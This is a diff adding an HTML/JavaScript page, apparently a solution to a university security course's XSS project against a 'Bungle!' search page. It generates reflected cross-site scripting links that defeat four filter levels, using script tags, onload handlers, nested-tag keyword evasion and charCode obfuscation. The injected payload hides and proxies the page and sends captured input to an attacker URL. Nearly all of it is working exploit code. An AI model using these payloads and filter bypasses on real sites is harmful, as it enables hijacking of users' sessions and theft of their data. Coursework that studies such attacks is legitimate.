@@ -1,0 +1,69 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+// Extend this function:
+function payload(attacker) {
+	function recordEvent(input) {
+		console.log(input);
+		$.get(attacker, input);
+	}
+
+	function proxy(href) {
+		$("html").load(href, function() {
+			$("html").show();
+			$("#query").val("pwned!");
+			
+		});
+	}
+	$("html").hide();
+	proxy("./");
+}
+
+function makeLink(xssdefense, target, attacker) {
+
+	var url = target + "./search?xssdefense=" + xssdefense.toString() + "&q=";
+	var scriptBody = payload.toString() + ";payload(\"" + attacker + "\");";
+	if (xssdefense == 0) {
+		return 	url + encodeURIComponent("<script" + ">" + scriptBody + "</script" + ">");
+	} else if (xssdefense == 1) {
+		return url +  encodeURIComponent("<body  onload=\'" + scriptBody + "\'/>");  
+	} else if (xssdefense == 2) {
+		return url + encodeURIComponent("<scrscriptipt>" + scriptBody + " </scrscriptipt" + ">"); 
+	} else if (xssdefense == 3) {
+
+		var len  = scriptBody.length,  i = 0;
+		var encodedText = "";
+		for (i = 0; i < len -1; i++) {
+			encodedText += scriptBody.charCodeAt(i) + ",";
+		}
+
+		encodedText += scriptBody.charCodeAt(i);
+
+		return url + encodeURIComponent("<script" + ">" + "new Function(String.fromCharCode(" + encodedText + "))()" + 
+			"</script" + ">"); 
+	}
+}
+
+var xssdefense = 0;
+var target = "http://cs526-s18.cs.purdue.edu/project3/";
+var attacker = "http://127.0.0.1:31337/stolen";
+
+$(function() {
+	var i = 0;
+	var head = "";
+	for (i = 0; i <= 3; i++) {
+		xssdefense = i;
+		head = "defense" + i;
+		alert(head);
+		var url = makeLink(xssdefense,target, attacker);
+		$("#" + head).html("<a target=\"run\" href=\"" + url + "\">Try Bungle! xssdefense=" + xssdefense.toString() + "</a>");
+
+	}
+});
+
+</script>
+<h3 id="defense0"> </h3>
+<h3 id="defense1"></h3>
+<h3 id="defense2"></h3>
+<h3 id="defense3"></h3>
